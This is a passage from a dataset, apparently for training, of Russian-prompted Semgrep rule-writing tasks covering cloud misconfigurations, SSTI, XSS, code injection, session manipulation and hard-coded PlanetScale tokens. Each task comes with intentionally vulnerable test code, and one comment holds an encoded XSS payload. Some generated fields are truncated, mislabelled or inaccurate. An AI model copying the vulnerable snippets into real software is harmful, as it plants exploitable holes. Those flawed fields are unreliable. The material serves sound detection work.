\"google_bigquery_table_iam_member\" \"fail2\" {\n  cluster = \"my-public-table-member2\"\n  role    = \"roles/bigquery.readSessionUser\"\n  member  = \"allUsers\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_bigquery_table_iam_member\" \"fail1\" { cluster = \\\"my-public-table-member1\\\" role = \\\"roles/bigquery.metadataViewer\\\" member = \\\"allAuthenticatedUsers\\\" }\n• resource \"google_bigquery_table_iam_member\" \"fail2\" { cluster = \\\"my-public-table-member2\\\" role = \\\"roles/bigquery.readSessionUser\\\" member = \\\"allUsers\\\" }\n\nБезопасные паттерны:  \n• resource \"google_bigquery_table_iam_member\" \"pass1\" { cluster = \\\"my-private-table-member1\\\" role = \\\"roles/bigquery.connectionUser\\\" member = \\\"group:mygroup@example.com\\\" }\n• resource \"google_bigquery_table_iam_member\" \"pass2\" { cluster = \\\"my-private-table-member2\\\" role = \\\"roles/bigquery.dataEditor\\\" member = \\\"domain:example.com\\\" }\n\nЛегенда аннотаций:\n- // ruleid:gcp-bigquery-private-table-iam-member: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-bigquery-private-table-iam-member: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-bigquery-private-table-iam-member\n  patterns:\n  - pattern: resource\n  - pattern-either:\n    - pattern-inside: |\n        resource \"google_bigquery_table_iam_member\" \"...\" {\n        ...\n        member = \"allAuthenticatedUsers\"\n        ...\n        }\n    - pattern-inside: |\n        resource \"google_bigquery_table_iam_member\" \"...\" {\n        ...\n        member = \"allUsers\"\n        ...\n        }\n  message: >-\n    Ensure that BigQuery Tables are not anonymously or publicly accessible\t\t\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://docs.bridgecrew.io/docs/google-cloud-policy-index\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google BigQuery Table IAM Member в конфигурациях Terraform, где членство установлено либо на \"allAuthenticatedUsers\", либо на \"allUsers\". Эти настройки предоставляют анонимный или публичный доступ к таблицам BigQuery, что нарушает контроль доступа и может привести к утечке данных. Правило использует шаблон ресурса и проверяет содержимое блока member внутри шаблона ресурса, чтобы выявить опасные конфигурации.\n\n# Ключевые элементы:\n- ID: gcp-bigquery-private-table-iam-member\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-bigquery-private-table-iam-member",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: open-never-closed\nОписание уязвимости: file object opened without corresponding close\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: open-never-closed.py\ndef func1():\n    # ruleid:open-never-closed\n    fd = open('foo')\n    x = 123\n\n\ndef func2():\n    # ok:open-never-closed\n    fd = open('bar')\n    fd.close()\n\ndef func3():\n    # ok:open-never-closed\n    fd = open('baz')\n    try:\n        pass\n    finally:\n        fd.close()  # Ограничиваем длину\n\nОпасные паттерны:\n• fd = open('foo')\nx = 123\n• fd = io.open('bar')\n• fd = tarfile.open('baz')\n\nБезопасные паттерны:  \n• fd = open('bar')\nfd.close()\n• fd = io.open('qux')\ntry:\n...\nfinally:\nfd.close()\n\nЛегенда аннотаций:\n- // ruleid:open-never-closed: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:open-never-closed: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: open-never-closed\n    patterns:\n      - pattern-not-inside: |\n          $F = open(...)\n          ...\n          $F.close()\n      - pattern-not-inside: |\n          $F = io.open(...)\n          ...\n          $F.close()\n      - pattern-not-inside: |\n          $F = tarfile.open(...)\n          ...\n          $F.close()\n      - pattern-not-inside: |\n          $F = ZipFile.open(...)\n          ...\n          $F.close()\n      - pattern-not-inside: |\n          $F = tempfile.TemporaryFile(...)\n          ...\n          $F.close()\n      - pattern-not-inside: |\n          $F = tempfile.NamedTemporaryFile(...)\n          ...\n          $F.close()\n      - pattern-not-inside: |\n          $F = tempfile.SpooledTemporaryFile(...)\n          ...\n          $F.close()\n      - pattern-not-inside: |\n          $F = open(...)\n          ...\n          try:\n              ...\n          finally:\n              $F.close()\n      - pattern-not-inside: |\n          $F = io.open(...)\n          ...\n          try:\n              ...\n          finally:\n              $F.close()\n      - pattern-not-inside: |\n          $F = tarfile.open(...)\n          ...\n          try:\n              ...\n          finally:\n              $F.close()\n      - pattern-not-inside: |\n          $F = ZipFile.open(...)\n          ...\n          try:\n              ...\n          finally:\n              $F.close()\n      - pattern-not-inside: |\n          $F = tempfile.TemporaryFile(...)\n          ...\n          try:\n              ...\n          finally:\n              $F.close()\n      - pattern-not-inside: |\n          $F = tempfile.NamedTemporaryFile(...)\n          ...\n          try:\n              ...\n          finally:\n              $F.close()\n      - pattern-not-inside: |\n          $F = tempfile.SpooledTemporaryFile(...)\n          ...\n          try:\n              ...\n          finally:\n              $F.close()\n      - pattern-either:\n          - pattern: $F = open(...)\n          - pattern: $F = io.open(...)\n          - pattern: $F = tarfile.open(...)\n          - pattern: $F = ZipFile.open(...)\n          - pattern: $F = tempfile.TemporaryFile(...)\n          - pattern: $F = tempfile.NamedTemporaryFile(...)\n          - pattern: $F = tempfile.SpooledTemporaryFile(...)\n    message: file object opened without corresponding close\n    languages: [python]\n    severity: ERROR\n    metadata:\n      category: best-practice\n      technology:\n        - python\n\n\n# Логика правила:\nЭто правило ищет случаи, когда объект файла открывается функцией open или аналогичными функциями из модулей io, tarfile, ZipFile, tempfile, но не закрывается соответствующей инструкцией close. Паттерны используют оператор pattern-not-inside для поиска открывания файла без последующего закрытия внутри блока ... . Также используется оператор pattern-either для объединения различных вариантов открытия файлов. Правило применимо только к языку Python.\n\n# Ключевые элементы:\n- ID: open-never-closed\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "open-never-closed",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "globals-as-template-context\nОписание уязвимости: Using 'globals()' as a context to 'render(...)' is extremely dangerous. This exposes Python functions to the template that were not meant to be exposed. An attacker could use these functions to execute code that was not intended to run and could compromise the application. (This is server-side template injection (SSTI)). Do not use 'globals()'. Instead, specify each variable in a dictionary or 'django.template.Context' object, like '{\"var1\": \"hello\"}' and use that instead.\nCWE: CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: globals-as-template-context.py\nimport base64\nimport mimetypes\nimport os\n\nfrom django.core.urlresolvers import reverse\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect, render\nfrom django.views.decorators.csrf import csrf_exempt\nfrom django.template import Template\n\n# adapted from https://github.com/mpirnat/lets-be-bad-guys/blob/7cbf11014bfc6dc9e199dc0b8a64e4597bc2338f/badguys/vulnerable/views.py#L95\n\ndef file_access(request):\n    msg = request.GET.get('msg', '')\n    # ok: globals-as-template-context\n    return render(request, 'vulnerable/injection/file_access.html',\n            {'msg': msg})\n\n\ndef bad1(request):\n    # ruleid: globals-as-template-context\n    response = render(request, 'vulnerable/xss/form.html', globals())\n    response.set_cookie(key='monster', value='omnomnomnomnom!')\n    return response\n\n\ndef bad2(request, path='default'):\n    env = globals()\n    # ruleid: globals-as-template-context\n    return render(request, 'vulnerable/xss/path.html', env)\n\n\ndef bad3(request):\n    # ruleid: globals-as-template-context\n    response = Template.render(request, 'vulnerable/xss/form.html', globals())\n    response.set_cookie(key='monster', value='omnomnomnomnom!')\n    return response\n\n\ndef bad4(request, path='default'):\n    env = globals()\n    # ruleid: globals-as-template-context\n    return Template.render(request, 'vulnerable/xss/path.html', env)  # Ограничиваем длину\n\nОпасные паттерны:\n• response = render(request, 'vulnerable/xss/form.html', globals())\n• env = globals(); return render(request, 'vulnerable/xss/path.html', env)\n• Template.render(request, 'vulnerable/xss/form.html', globals())\n\nБезопасные паттерны:  \n• return render(request, 'vulnerable/injection/file_access.html', {'msg': msg})\n• response = render(request, 'vulnerable/xss/form.html', {'var1': 'value1'})\n• template = Template('...'); context = Context({'var1': 'value1'}); template.render(context)\n\nЛегенда аннотаций:\n- // ruleid:globals-as-template-context: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:globals-as-template-context: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: globals-as-template-context\n  languages:\n  - python\n  message: >-\n    Using 'globals()' as a context to 'render(...)' is extremely dangerous.\n    This exposes Python functions to the template that were not meant to be exposed.\n    An attacker could use these functions to execute code that was not intended to run\n    and could compromise the application. (This is server-side template injection (SSTI)).\n    Do not use 'globals()'. Instead, specify each variable in a dictionary or\n    'django.template.Context' object, like '{\"var1\": \"hello\"}' and use that instead.\n  metadata:\n    category: security\n    cwe:\n    - \"CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://docs.djangoproject.com/en/3.2/ref/settings/#templates\n    - https://docs.djangoproject.com/en/3.2/topics/templates/#django.template.backends.django.DjangoTemplates\n    - https://docs.djangoproject.com/en/3.2/ref/templates/api/#rendering-a-context\n    technology:\n    - django\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  pattern-either:\n  - pattern: django.shortcuts.render(..., globals(...), ...)\n  - pattern: django.template.Template.render(..., globals(...), ...)\n  - patterns:\n    - pattern-inside: |\n        $CONTEXT = globals(...)\n        ...\n    - pattern-either:\n      - pattern: django.shortcuts.render(..., $CONTEXT, ...)\n      - pattern: django.template.Template.render(..., $CONTEXT, ...)\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции 'globals()' при передаче контекста шаблону Django. Паттерны ищут вызовы функций 'django.shortcuts.render' или 'django.template.Template.render' с аргументом 'globals()' внутри них. Также проверяется присваивание переменной контекста через выражение '$CONTEXT = globals(...)'. Если обнаруживается такой вызов или присвоение, правило отмечает код как потенциально опасный.\n\n# Ключевые элементы:\n- ID: globals-as-template-context\n- Язык: python \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "globals-as-template-context",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: printed-request\nОписание уязвимости: `Printing user input risks cross-site scripting vulnerability. You should use `htmlentities()` when showing data to users.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: taint\nЯзык: php\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: php\n- Тип анализа: taint\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: printed-request.php\n<?php\n\n// example key-value: name=%3Cscript%3Econfirm%28%29%3C%2Fscript%3E\nfunction dangerousEchoUsage() {\n    $name = $_REQUEST['name'];\n    // ruleid: printed-request\n    print(\"Hello : $name\");\n    // ruleid: printed-request\n    print(\"Hello : \" . $name);\n}\n\nfunction safeEchoUsage() {\n    $name = $_REQUEST['name'];\n    // ok: printed-request\n    print(\"Hello : \" . htmlentities($name));\n}\n\nfunction doSmth() {\n    $name = $_REQUEST['name'];\n    // ruleid: printed-request\n    print(\"Hello :\".$name);\n}\n\nfunction doSmth2() {\n    // ruleid: printed-request\n    print(\"Hello \".$_POST['name'].\" !\");\n}\n\nfunction doSmth3() {\n    $name = $_GET['name'];\n    if (str_contains($name, 'foobar')) {\n        // ruleid: printed-request\n        print(\"Hello :\".$name);\n    }\n}\n\nfunction doSmth4() {\n    // ruleid: printed-request\n    print(\"Hello \".htmlentities($_POST['name']).\" !\".$_POST['lastname']);\n}\n\nfunction doSmth5() {\n     // ruleid: printed-request\n    print(\"Hello \".trim($_POST['name']));\n}\n\nfunction doSmth6() {\n    $VAR = $_GET['someval'];\n     if(isset($VAR)){ \n         // ruleid: printed-request\n         print($VAR); \n     }\n }\n \n function doSmth7() {\n     $VAR = $_GET['someval'];\n      if(empty($VAR)){ \n          // ruleid: printed-request\n          print($VAR); \n      }\n  }\n\nfunction doOK1() {\n    // ok: printed-request\n    print(\"Hello \".htmlentities($_POST['name']).\" !\");\n}\n\nfunction doOK2() {\n    $input = $_GET['name'];\n    // ok: printed-request\n    print(\"Hello \".htmlspecialchars($input).\" !\");\n}\n\nfunction doOK3() {\n    $safevar = \"Hello \".htmlentities(trim($_GET['name']));\n    // ok: printed-request\n    print($safevar);\n}\n\nfunction doOK4() {\n    // ok: printed-request\n    print(\"Hello \".e($_POST['name']).\" !\");\n}\n\nfunction doOK5() {\n    $safevar = esc_attr($_GET['name']);\n    // ok: printed-request\n    print(\"Hello $safevar !\");\n}\n\nfunction doOK6() {\n    $safevar = \"Hello \".htmlentities($_GET['name']);\n    // ok: printed-request\n    prin  # Ограничиваем длину\n\nОпасные паттерны:\n• print(\\\n• );\n• print(\\\n\nБезопасные паттерны:  \n• print(\\\n•  . htmlentities($name));\n• print(\\\n\nЛегенда аннотаций:\n- // ruleid:printed-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:printed-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: printed-request\n  mode: taint\n  message: >-\n    `Printing user input risks cross-site scripting vulnerability.\n    You should use `htmlentities()` when showing data to users.\n  languages: [php]\n  severity: ERROR\n  pattern-sources:\n  - pattern: $_REQUEST\n  - pattern: $_GET\n  - pattern: $_POST\n  pattern-sinks:\n  - pattern: print($...VARS);\n  pattern-sanitizers:\n  - pattern: htmlentities(...)\n  - pattern: htmlspecialchars(...)\n  - pattern: strip_tags(...)\n  - pattern: isset(...)\n  - pattern: empty(...)\n  # Wordpress Escapes\n  - pattern: esc_html(...)\n  - pattern: esc_attr(...)\n  - pattern: wp_kses(...)\n  # Laravel Escapes\n  - pattern: e(...)\n  # Symfony Escapes\n  - pattern: twig_escape_filter(...)\n  # CodeIgniter Escapes\n  - pattern: xss_clean(...)\n  - pattern: html_escape(...)\n  # Drupal Escapes\n  - pattern: Html::escape(...)\n  - pattern: Xss::filter(...)\n  # Magento Escapes\n  - pattern: escapeHtml(...)\n  # Laminas Escapes\n  - pattern: escapeHtml(...)\n  - pattern: escapeHtmlAttr(...)\n  fix: print(htmlentities($...VARS));\n  metadata:\n    technology:\n    - php\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    category: security\n    references:\n    - https://www.php.net/manual/en/function.htmlentities.php\n    - https://www.php.net/manual/en/reserved.variables.request.php\n    - https://www.php.net/manual/en/reserved.variables.post.php\n    - https://www.php.net/manual/en/reserved.variables.get.php\n    - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nОбъяснение не сгенерировано\n\n# Ключевые элементы:\n- ID: printed-request\n- Язык: php \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "printed-request",
      "language": "php",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения aws-insecure-redshift-ssl-configuration\nОписание уязвимости: Detected an AWS Redshift configuration with a SSL disabled. To fix this, set your `require_ssl` to `\"true\"`.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-insecure-redshift-ssl-configuration.tf\n# ruleid: aws-insecure-redshift-ssl-configuration\nresource \"aws_redshift_parameter_group\" \"failasfalse\" {\n  name   = var.param_group_name\n  family = \"redshift-1.0\"\n\n  parameter {\n    name  = \"require_ssl\"\n    value = \"false\"\n  }\n\n  parameter {\n    name  = \"enable_user_activity_logging\"\n    value = \"true\"\n  }\n}\n\n# ruleid: aws-insecure-redshift-ssl-configuration\nresource \"aws_redshift_parameter_group\" \"fail\" {\n  name   = var.param_group_name\n  family = \"redshift-1.0\"\n\n}\n\n\nresource \"aws_redshift_parameter_group\" \"pass\" {\n  name   = var.param_group_name\n  family = \"redshift-1.0\"\n\n  parameter {\n    name  = \"require_ssl\"\n    value = \"true\"\n  }\n\n  parameter {\n    name  = \"enable_user_activity_logging\"\n    value = \"true\"\n  }\n}\n\nresource \"aws_redshift_parameter_group\" \"passbutbool\" {\n  name   = var.param_group_name\n  family = \"redshift-1.0\"\n\n  parameter {\n    name  = \"require_ssl\"\n    value = true\n  }\n\n  parameter {\n    name  = \"enable_user_activity_logging\"\n    value = \"true\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_redshift_parameter_group\" \"failasfalse\" { ... parameter { name = \"require_ssl\" value = \"false\" } ... }\n• resource \"aws_redshift_parameter_group\" \"fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"aws_redshift_parameter_group\" \"pass\" { ... parameter { name = \"require_ssl\" value = \"true\" } ... }\n• resource \"aws_redshift_parameter_group\" \"passbutbool\" { ... parameter { name = \"require_ssl\" value = true } ... }\n\nЛегенда аннотаций:\n- // ruleid:aws-insecure-redshift-ssl-configuration: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-insecure-redshift-ssl-configuration: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-insecure-redshift-ssl-configuration\n  patterns:\n  - pattern: |\n      resource \"aws_redshift_parameter_group\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_redshift_parameter_group\" $ANYTHING {\n        ...\n        parameter {\n          name  = \"require_ssl\"\n          value = \"true\"\n        }\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_redshift_parameter_group\" $ANYTHING {\n        ...\n        parameter {\n          name  = \"require_ssl\"\n          value = true\n        }\n        ...\n      }\n  message: >-\n    Detected an AWS Redshift configuration with a SSL disabled. To fix this, set your `require_ssl` to\n    `\"true\"`.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Amazon Redshift, где параметр 'require_ssl' не установлен или имеет значение 'false'. Анализ выполняется путем поиска ресурса 'aws_redshift_parameter_group', за которым не следует блок параметров, содержащий корректное значение 'require_ssl'. Правило использует отрицательные условия внутри шаблонов, чтобы исключить случаи, когда параметр 'require_ssl' явно установлен верно.\n\n# Ключевые элементы:\n- ID: aws-insecure-redshift-ssl-configuration\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-insecure-redshift-ssl-configuration",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: mb-ereg-replace-eval\nОписание уязвимости: Calling mb_ereg_replace with user input in the options can lead to arbitrary code execution. The eval modifier (`e`) evaluates the replacement argument as code.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: mb-ereg-replace-eval.php\n<?php\n\n// ruleid: mb-ereg-replace-eval\nmb_ereg_replace($pattern, $replacement, $string, $user_input_options);\n\n// ok: mb-ereg-replace-eval\nmb_ereg_replace($pattern, $replacement, $string, \"msr\");\n\n// ok: mb-ereg-replace-eval\nmb_ereg_replace($pattern, $replacement, $string);  # Ограничиваем длину\n\nОпасные паттерны:\n• mb_ereg_replace($pattern, $replacement, $string, $user_input_options);\n• mb_ereg_replace($pattern, $replacement, $string, $_GET['options']);\n\nБезопасные паттерны:  \n• mb_ereg_replace($pattern, $replacement, $string, \"msr\");\n• mb_ereg_replace($pattern, $replacement, $string);\n\nЛегенда аннотаций:\n- // ruleid:mb-ereg-replace-eval: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:mb-ereg-replace-eval: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: mb-ereg-replace-eval\n  patterns:\n  - pattern: mb_ereg_replace($PATTERN, $REPL, $STR, $OPTIONS);\n  - pattern-not: mb_ereg_replace($PATTERN, $REPL, $STR, \"...\");\n  message: >-\n    Calling mb_ereg_replace with user input in the options can lead to arbitrary\n    code execution. The eval modifier (`e`) evaluates the replacement argument\n    as code.\n  metadata:\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    references:\n    - https://www.php.net/manual/en/function.mb-ereg-replace.php\n    - https://www.php.net/manual/en/function.mb-regex-set-options.php\n    category: security\n    technology:\n    - php\n    owasp:\n    - A03:2021 - Injection\n    cwe2022-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages: [php]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции mb_ereg_replace в PHP с параметром options, который содержит пользовательский ввод. Опасность заключается в том, что модификатор 'e' интерпретирует аргумент замены как исполняемый код, что может привести к выполнению произвольного кода. Правило использует шаблон для сопоставления вызова функции mb_ereg_replace и проверяет наличие модификатора 'e' в параметре options. Если параметр options не содержит '...', считается, что он содержит пользовательский ввод и потенциально опасен.\n\n# Ключевые элементы:\n- ID: mb-ereg-replace-eval\n- Язык: php \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "mb-ereg-replace-eval",
      "language": "php",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения avoid-session-manipulation\nОписание уязвимости: This gets data from session using user inputs. A malicious user may be able to retrieve information from your session that you didn't intend them to. Do not use user input as a session key.\nCWE: CWE-276: Incorrect Default Permissions\nТип анализа: taint\nЯзык: ruby\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: taint\n- CWE: CWE-276: Incorrect Default Permissions\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-session-manipulation.rb\n# ruleid: avoid-session-manipulation\nid = session[params[:uid]]\n\nuid = params[:uid]\n# ruleid: avoid-session-manipulation\nid = session[uid]\n\n# ok: avoid-session-manipulation\nid = session[user_id]  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: avoid-session-manipulation.rb\n# ruleid: avoid-session-manipulation\nid = session[params[:uid]]\n• // File: avoid-session-manipulation.rb\n# ruleid: avoid-session-manipulation\nid = session[uid]\n\nБезопасные паттерны:  \n• // File: avoid-session-manipulation.rb\n# ok: avoid-session-manipulation\nid = session[user_id]\n\nЛегенда аннотаций:\n- // ruleid:avoid-session-manipulation: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-session-manipulation: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-session-manipulation\n  metadata:\n    shortDescription: Allowing an attacker to manipulate the session may lead to unintended behavior.\n    tags: [security]\n    owasp:\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-276: Incorrect Default Permissions'\n    references:\n    - https://brakemanscanner.org/docs/warning_types/session_manipulation/\n    category: security\n    technology:\n    - rails\n    help: |\n      ## Remediation\n      Session manipulation can occur when an application allows user-input in session keys. Since sessions are typically considered a source of truth (e.g. to check the logged-in user or to match CSRF tokens), allowing an attacker to manipulate the session may lead to unintended behavior.\n\n      ## References\n      [Session Manipulation](https://brakemanscanner.org/docs/warning_types/session_manipulation/)\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  message: >-\n    This gets data from session using user inputs. A malicious user may be able to retrieve\n    information from your session that you didn't intend them to. Do not use user input as\n    a session key.\n  languages: [ruby]\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - pattern: params\n  - pattern: cookies\n  - pattern: request.env\n  pattern-sinks:\n  - pattern: session[...]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования пользовательского ввода в качестве ключа сессии, что может позволить злоумышленнику манипулировать сессией и получить доступ к нежелательной информации. Анализ выполняется методом taint, где источники (sources) включают параметры запроса (params), куки (cookies) и окружение запроса (request.env). Синики (sinks) определяются как обращение к сессии по ключу, переданному через эти источники.\n\n# Ключевые элементы:\n- ID: avoid-session-manipulation\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-session-manipulation",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: planetscale-password\nОписание уязвимости: A gitleaks planetscale-password was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: planetscale-password.go\n// ruleid: planetscale-password\nplanetScalePassword_api_token = \"pscale_pw_d6kvuewnpziee30nfl3d8ldxdi8=4d21\"\nplanetScalePassword_api_token = \"pscale_tkn_ci7yg072sgqyxr=l30e_y2r1=11uic5m\"\nplanetScalePassword_api_token = \"pscale_oauth_132tp-ag=4set2_7yhibbj8m1-xcsk3y\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: planetscale-password.go\n// ruleid: planetscale-password\nplanetScalePassword_api_token = \"pscale_pw_d6kvuewnpziee30nfl3d8ldxdi8=4d21\"\n• // File: another-go-file.go\n// ruleid: planetscale-password\nconst pscaleToken = \"pscale_pw_abc123xyz456\"\n• // File: yet-another-go-file.go\n// ruleid: planetscale-password\nvar apiKey string = \"pscale_pw_qwertyuiop1234567890\"\n\nБезопасные паттерны:  \n• // File: safe-go-file.go\n// ruleid: planetscale-password\nplanetScalePassword_api_token = os.Getenv(\"PLANETSCALE_API_TOKEN\")\n• // File: secure-go-file.go\n// ruleid: planetscale-password\napiKey := getSecureApiKeyFromVault()\n• // File: other-safe-go-file.go\n// ruleid: planetscale-password\nconfig := config.LoadConfig(); apiKey := config.GetApiKey()\n\nЛегенда аннотаций:\n- // ruleid:planetscale-password: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:planetscale-password: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: planetscale-password\n  message: A gitleaks planetscale-password was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(pscale_pw_(?i)[a-z0-9=\\-_\\.]{32,64})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных паролей PlanetScale API в исходном коде. Оно ищет строку, начинающуюся с 'pscale_pw_' за которой следует последовательность из 32-64 символов, состоящих из букв, цифр, знаков подчеркивания, дефисов и равенств. После этого может следовать один из специальных символов или конец 